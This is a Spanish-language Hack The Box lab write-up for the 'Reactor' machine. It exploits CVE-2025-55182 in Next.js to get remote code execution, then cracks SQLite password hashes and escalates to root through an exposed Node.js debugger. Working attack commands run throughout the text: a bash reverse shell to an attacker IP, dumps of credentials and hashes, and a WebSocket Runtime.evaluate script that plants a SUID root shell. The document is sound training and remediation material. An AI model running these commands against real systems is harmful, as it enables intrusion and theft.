---
layout: single
classes: wide
title: "Reactor - Writeup"
date: 2026-05-23
difficulty: FÃ¡cil
operating_system: Linux
tags:
  - HTB
  - Linux
  - FÃ¡cil
  - CVE-2025-55182
  - React2Shell
  - Next.js
  - Node.js
  - Debugger
  - RCE
summary: "ExplotaciÃ³n de CVE-2025-55182 (React2Shell) en Next.js 15.0.3 para obtener RCE, cracking de hash sqlite, y escalada a root mediante Node.js debugger inspector expuesto."
---

## InformaciÃ³n general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | FÃ¡cil |
| IP | 10.129.7.228 |
| Tags | `CVE-2025-55182`, `React2Shell`, `Next.js`, `Node.js`, `Debugger`, `RCE` |
{: .info-table}

## Reconocimiento

Empezamos con un escaneo completo de puertos para identificar la superficie expuesta del servidor. Solo vimos dos puertos abiertos: SSH y una aplicaciÃ³n web en el puerto 3000.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.7.228
```

Con los puertos identificados, hicimos un escaneo mÃ¡s detallado con scripts de enumeraciÃ³n para obtener versiones y fingerprints de cada servicio detectado.

```bash
nmap -p22,3000 -sCV 10.129.7.228
```

Descubrimos que el puerto 3000 ejecuta **Next.js** (confirmado por el header `X-Powered-By: Next.js`). La aplicaciÃ³n se llama **REACTORWATCH â€” Core Monitoring System v3.2.1**, un dashboard de monitoreo de un reactor nuclear ficticio. El buildId de Next.js es `L3bimJe_3LvBcFWAnK5L4`.

Los indicadores mÃ¡s Ãºtiles de esta fase fueron:

- **22/tcp** â€” SSH OpenSSH 9.6p1, acceso remoto si conseguimos credenciales.
- **3000/tcp** â€” HTTP con Next.js, identificado por las cabeceras `X-Powered-By: Next.js` y `x-nextjs-prerender: 1`. Sin cookies de autenticaciÃ³n visibles.

## EnumeraciÃ³n

Analizando la aplicaciÃ³n web, identificamos tres miembros del personal en el panel principal. Estos nombres son potenciales usuarios para SSH:

| Avatar | Nombre | Rol | Estado |
|--------|--------|-----|--------|
| DR | Dr. Elena Rodriguez | Lead Nuclear Engineer | ONLINE |
| MK | Marcus Kim | Senior Technician | ONLINE |
| JT | James Thompson | Safety Officer | OFFLINE |

La aplicaciÃ³n no expone rutas de API (`/api/*` devuelve 404). No hay cookies ni autenticaciÃ³n visible. El `_buildManifest.js` confirma que solo hay dos pÃ¡ginas registradas en el Pages Router: `/_app` y `/_error`. El contenido real usa App Router con una Ãºnica pÃ¡gina principal.

Identificamos que la versiÃ³n de Next.js (15.0.3) es potencialmente vulnerable a CVE-2025-29927, un bypass de middleware de autenticaciÃ³n, pero el exploit pÃºblico CVE-2025-55182 (React2Shell) ofrecÃ­a RCE directo sin necesidad de autenticaciÃ³n, asÃ­ que priorizamos ese camino.

## MetodologÃ­a de anÃ¡lisis del vector inicial

Identificamos que la aplicaciÃ³n corre Next.js 15.0.3 por las cabeceras HTTP y los build artifacts. Esta versiÃ³n es notoria en el Ã¡mbito de CTF por dos vulnerabilidades:

- **CVE-2025-29927**: Bypass de middleware de autenticaciÃ³n mediante la cabecera `x-middleware-subrequest`.
- **CVE-2025-55182** (React2Shell): RCE por deserializaciÃ³n (CVSS 10.0) en React Server Components.

Aunque CVE-2025-29927 podrÃ­a permitir eludir autenticaciÃ³n, la ausencia de un panel con login claro en la aplicaciÃ³n hacÃ­a difÃ­cil aprovecharlo. En cambio, CVE-2025-55182 ofrecÃ­a RCE directo sin necesidad de autenticaciÃ³n, asÃ­ que priorizamos ese camino.

## ExplotaciÃ³n

CVE-2025-55182, conocido como **React2Shell**, es una vulnerabilidad de deserializaciÃ³n insegura (CVSS 10.0) que afecta a Next.js App Router en todas las versiones 15.x. Permite ejecuciÃ³n remota de cÃ³digo no autenticada a travÃ©s de React Server Components (RSC).

Clonamos el exploit pÃºblico desde GitHub para tener acceso a la herramienta de explotaciÃ³n.

### CVE-2025-55182 â€” React2Shell

**CVE-2025-55182** es una vulnerabilidad de ejecuciÃ³n remota de cÃ³digo por deserializaciÃ³n insegura que afecta a React Server Components (RSC) en Next.js App Router 15.x. Su CVSS es 10.0 â€” crÃ­tico mÃ¡ximo. Permite a un atacante no autenticado ejecutar comandos arbitrarios en el servidor simplemente enviando una peticiÃ³n manipulada al endpoint RSC.

Clonamos el PoC disponible para explotarla.

```bash
git clone https://github.com/rubensuxo-eh/react2shell-exploit.git
```

Primero probamos la ejecuciÃ³n remota de un comando simple para confirmar que el RCE funciona. El exploit nos devuelve la salida de `whoami` directamente.

```bash
python3 exploit.py --url http://10.129.7.228:3000 --cmd "whoami"
```

El exploit confirma que el servidor ejecuta los comandos como el usuario **node**. Con el RCE confirmado, necesitamos una shell interactiva para explorar el sistema. Enviamos una reverse shell apuntando a nuestra mÃ¡quina atacante.

```bash
python3 exploit.py --url http://10.129.7.228:3000 --cmd "bash -c 'bash -i >& /dev/tcp/10.10.15.130/4444 0>&1'"
```

Recibimos la conexiÃ³n y ahora tenemos una shell como `node`. Listamos las variables de entorno para descubrir credenciales, rutas de bases de datos y otros secretos de la aplicaciÃ³n.

```bash
env
```

```text
SHELL=/bin/bash
USER=node
DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3
SENSOR_API_KEY=[REDACTED]
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
PORT=3000
NODE_ENV=production
HOME=/home/node
PWD=/opt/reactor-app
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
NEXT_RUNTIME=nodejs
__NEXT_PRIVATE_ORIGIN=http://localhost:3000
```

Entre las variables de entorno encontramos `DB_PATH=/opt/reactor-app/reactor.db`, `DB_TYPE=sqlite3`, y una `SENSOR_API_KEY`. La base de datos SQLite contiene credenciales de usuario. Abrimos la base de datos directamente para inspeccionar su contenido.

```bash
sqlite3 /opt/reactor-app/reactor.db
```

Listamos las tablas disponibles y luego extraemos todos los registros de usuarios para obtener los hashes de contraseÃ±a.

```bash
.tables
SELECT * FROM users;
```

La tabla `users` contenÃ­a dos entradas:

- `admin` â€” hash `a203b22191d744a4e70ada5c101b17b8`
- `engineer` â€” hash `39d97110eafe2a9a68639812cd271e8e`

Los hashes obtenidos fueron:

| Usuario | Hash | Estado |
|---------|------|--------|
| admin | `a203b22191d744a4e70ada5c101b17b8` | No crackeado |
| engineer | `39d97110eafe2a9a68639812cd271e8e` | Crackeado â†’ `[REDACTED]` |

Probamos el hash de engineer contra rockyou y se crackeÃ³ correctamente. El de admin no estaba en el wordlist.

Crackeamos el hash del usuario `engineer` con rockyou y obtuvimos la contraseÃ±a `[REDACTED]`. El hash de `admin` no se pudo crackear con el mismo diccionario. Con la contraseÃ±a en nuestro poder, cambiamos al usuario engineer mediante `su`.

```bash
su engineer
```

Ya como engineer, leemos la flag de usuario desde su directorio personal.

```bash
cat /home/engineer/user.txt
```

## Escalada de privilegios

Verificamos nuestra identidad y los grupos a los que pertenece engineer. Vimos que estÃ¡ en el grupo `lxd`, lo que podrÃ­a ser un vector de escalada.

```bash
id
```

Probamos escalar por LXD pero descubrimos que el demonio LXD no estÃ¡ instalado en el sistema, asÃ­ que descartamos esa ruta y buscamos otra. Enumeramos los servicios en ejecuciÃ³n para encontrar procesos corriendo con privilegios elevados.

```bash
systemctl list-units --type=service --state=running
```

Un servicio llamÃ³ nuestra atenciÃ³n inmediatamente: `uptime-monitor.service`. Inspeccionamos su configuraciÃ³n para entender quÃ© hace y con quÃ© privilegios se ejecuta.

```bash
systemctl cat uptime-monitor.service
```

```ini
# /etc/systemd/system/uptime-monitor.service
[Unit]
Description=Internal uptime/latency monitor for the SSR app
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
Restart=on-failure
RestartSec=3
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

> El servicio corre como **root** y tiene el flag `--inspect=127.0.0.1:9229`, que expone el debugger de Node.js. Aunque estÃ¡ vinculado a localhost, un tÃºnel SSH nos permite acceder a Ã©l desde nuestra mÃ¡quina atacante.

El servicio ejecuta un script Node.js como **root** con el debugger inspector expuesto en `127.0.0.1:9229`. Esto significa que cualquiera con acceso local al puerto 9229 puede ejecutar cÃ³digo JavaScript arbitrario como root a travÃ©s del protocolo Chrome DevTools. Verificamos que el puerto efectivamente estÃ¡ escuchando.

```bash
ss -tlnp | grep 9229
```

El inspector de Node.js escucha en localhost, asÃ­ que necesitamos un tÃºnel SSH para alcanzarlo desde nuestra mÃ¡quina atacante. Creamos un forward del puerto 9229 local al 9229 remoto.

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.7.228
```

Con el tÃºnel activo, consultamos el endpoint `/json` del inspector para obtener el identificador Ãºnico de la sesiÃ³n de depuraciÃ³n y la URL del WebSocket.

```bash
curl http://127.0.0.1:9229/json
```

El inspector nos devuelve el `webSocketDebuggerUrl` con un UUID `[REDACTED]`. Usamos ese WebSocket para enviar una llamada `Runtime.evaluate` que copia `/bin/bash` a `/tmp/rootbash` y le asigna el bit SUID. Esto nos darÃ¡ una shell con privilegios de root.

```bash
node -e "
const WebSocket = require('ws');
const ws = new WebSocket('ws://127.0.0.1:9229/[REDACTED]');
ws.on('open', () => {
  ws.send(JSON.stringify({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: 'process.mainModule.require(\"child_process\").execSync(\"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\").toString()'
    }
  }));
});
ws.on('message', (d) => {
  console.log(d.toString());
  ws.close();
});
"
```

> El debugger respondiÃ³ confirmando la ejecuciÃ³n:
> ```json
> {"id":1,"result":{"result":{"type":"string","value":""}}}
> ```
> El comando se ejecutÃ³ correctamente como root.

Verificamos que el binario SUID se creÃ³ correctamente en `/tmp` con propietario root.

```bash
ls -la /tmp/rootbash
```

Ejecutamos el binario con `-p` (modo privileged, necesario para que bash preserve el EUID efectivo) y verificamos nuestra identidad.

```bash
/tmp/rootbash -p
whoami
```

Somos **root**. Leemos la flag final desde el directorio personal de root.

```bash
cat /root/root.txt
```

## Cadena de explotaciÃ³n

```text
CVE-2025-55182 (React2Shell) en Next.js 15.0.3
-> RCE como node
-> dump de env con DB_PATH y SENSOR_API_KEY
-> extracciÃ³n de hashes de sqlite
-> crackeo de hash de engineer
-> su engineer
-> LXD descartado (no instalado)
-> uptime-monitor.service como root con --inspect=127.0.0.1:9229
-> SSH tunnel + WebSocket Runtime.evaluate
-> SUID bash -> root
```

## Lecciones tÃ©cnicas

1. Las aplicaciones Next.js con App Router en versiones 15.x pueden tener RCE sin autenticar vÃ­a RSC si no se parchean (CVE-2025-55182).
2. Las variables de entorno y bases de datos SQLite pueden contener credenciales en texto plano o hasheables â€” el acceso a `env` y `.db` debe restringirse.
3. Pertenecer al grupo `lxd` sin que LXD estÃ© instalado es un seÃ±uelo â€” siempre verificar que el demonio exista antes de invertir tiempo.
4. El debugger inspector de Node.js (`--inspect`) expuesto en localhost sigue siendo accesible mediante SSH tunneling, y `Runtime.evaluate` permite ejecuciÃ³n de cÃ³digo arbitrario con los privilegios del proceso.

## RemediaciÃ³n

1. Mantener Next.js actualizado a la versiÃ³n mÃ¡s reciente que parchee CVE-2025-55182.
2. No exponer el debugger inspector de Node.js (`--inspect`) en ningÃºn entorno, ni siquiera en localhost, si hay posibilidad de tunneling.
3. Restringir el acceso a la base de datos SQLite de la aplicaciÃ³n y usar hashes mÃ¡s fuertes que MD5.
4. Separar cuentas de servicio (node) de cuentas de usuario interactivas (engineer) y evitar credenciales reutilizables.
5. Rotar la `SENSOR_API_KEY` si estaba en el `env` accesible por el usuario node.

## Flags

| Flag | Hash |
|------|------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## ConclusiÃ³n

HTB Reactor es una mÃ¡quina de dificultad FÃ¡cil que combina la explotaciÃ³n de una vulnerabilidad crÃ­tica de deserializaciÃ³n en Next.js 15.0.3 (CVE-2025-55182, React2Shell) para obtener RCE como `node`, extracciÃ³n de credenciales desde una base de datos SQLite, y escalada a root mediante el debugger inspector de Node.js expuesto localmente en el puerto 9229. La lecciÃ³n principal es que exponer el inspector de depuraciÃ³n de Node.js â€”incluso solo en localhostâ€” combinado con un tÃºnel SSH, permite ejecuciÃ³n de cÃ³digo arbitrario con los privilegios del proceso, en este caso root.
